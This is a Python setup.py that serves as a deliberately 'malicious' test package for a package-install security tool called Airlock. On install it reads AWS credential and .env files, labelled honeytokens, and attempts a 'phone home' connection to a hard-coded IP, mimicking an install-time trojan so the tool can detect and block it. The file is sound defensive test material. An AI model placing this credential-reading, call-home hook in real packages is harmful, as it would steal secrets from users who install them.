"""A DELIBERATELY 'malicious' test package for Airlock.

It is SAFE to run — the payload only reads the planted honeytokens (fake files) and
attempts one connection to a dead IP. But it does exactly what a real install-time
trojan does, so Airlock's gate should detonate it and return BLOCK.

Do NOT publish this to PyPI. Test it with:  python -m airlock examples/evil-demo
"""

import os
import socket

from setuptools import setup

# --- install-time payload (runs when pip builds/installs this package) ---
for _path in ("~/.aws/credentials", "~/.env"):
    try:
        with open(os.path.expanduser(_path)) as _f:
            _f.read()               # steal secrets
    except Exception:
        pass

try:
    _s = socket.socket()
    _s.settimeout(2)
    _s.connect(("45.11.87.9", 80))  # phone home (dead IP; the attempt is what's caught)
except Exception:
    pass

setup(name="evil-demo", version="0.0.1", py_modules=[])
